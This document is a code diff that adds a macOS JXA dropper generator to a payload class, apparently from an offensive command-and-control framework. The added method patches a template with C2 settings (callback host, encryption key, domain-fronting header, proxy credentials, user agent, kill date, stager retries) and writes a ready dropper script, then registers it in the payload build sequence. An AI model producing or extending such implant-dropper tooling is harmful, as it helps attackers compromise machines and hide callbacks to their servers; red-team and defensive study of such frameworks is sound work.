@@ -417,6 +417,38 @@ class Payloads(object):
         with open(filename, 'w') as f:
             f.write(base64.b64encode(dotnet.encode('UTF-8')).decode('utf-8'))
 
+    def CreateJXA(self, name=""):
+        self.QuickstartLog(Colours.END)
+        self.QuickstartLog("macOS JXA Dropper written to: %sdropper_jxa.js" % self.BaseDirectory)
+
+        # get the JXA dropper template
+        with open("%sdropper_jxa.js" % PayloadTemplatesDirectory, 'r') as f:
+            dropper_file = f.read()
+
+        # patch the key settings into the file
+        self.JXADropper = str(dropper_file) \
+            .replace("#REPLACEKILLDATE#", self.KillDate) \
+            .replace("#REPLACEKEY#", self.Key) \
+            .replace("#REPLACEHOSTPORT#", self.PayloadCommsHost) \
+            .replace("#REPLACEQUICKCOMMAND#", "/" + self.QuickCommand + "_jxa") \
+            .replace("#REPLACECONNECTURL#", self.ConnectURL + "?j") \
+            .replace("#REPLACEDOMAINFRONT#", self.DomainFrontHeader) \
+            .replace("#REPLACEREFERER#", self.Referrer) \
+            .replace("#REPLACEPROXYURL#", self.Proxyurl) \
+            .replace("#REPLACEPROXYUSER#", self.Proxyuser) \
+            .replace("#REPLACEPROXYPASSWORD#", self.Proxypass) \
+            .replace("#REPLACEURLID#", str(self.URLID)) \
+            .replace("#REPLACEUSERAGENT#", self.UserAgent) \
+            .replace("#REPLACESTAGERRETRIESLIMIT#", str(self.StageRetriesLimit).lower()) \
+            .replace("#REPLACESTAGERRETRIES#", str(self.StageRetries).lower()) \
+            .replace("#REPLACESTAGERRETRIESWAIT#", str(self.StageRetriesInitialWait)) \
+            .replace("#REPLACEIMPTYPE#", self.PayloadCommsHost)
+
+        jxa = self.JXADropper.encode('UTF-8')
+        jxadropper = jxa.decode('UTF-8')
+        with open("%s%sdropper_jxa.js" % (self.BaseDirectory, name), 'w') as f:
+            f.write(jxadropper)
+
     def CreatePython(self, name=""):
         self.QuickstartLog(Colours.END)
         self.QuickstartLog("Python2 OSX/Unix/Win Dropper written to: %spy_dropper.sh" % self.BaseDirectory)
@@ -751,6 +783,8 @@ class Payloads(object):
         self.CreateMsbuild(name)
         self.CreateCsc(name)
         self.CreateDonutShellcode(name)
+        self.CreateJXA(name)
+
         self.CreatePython(name)
         self.CreateDynamicCodeTemplate(name)
 
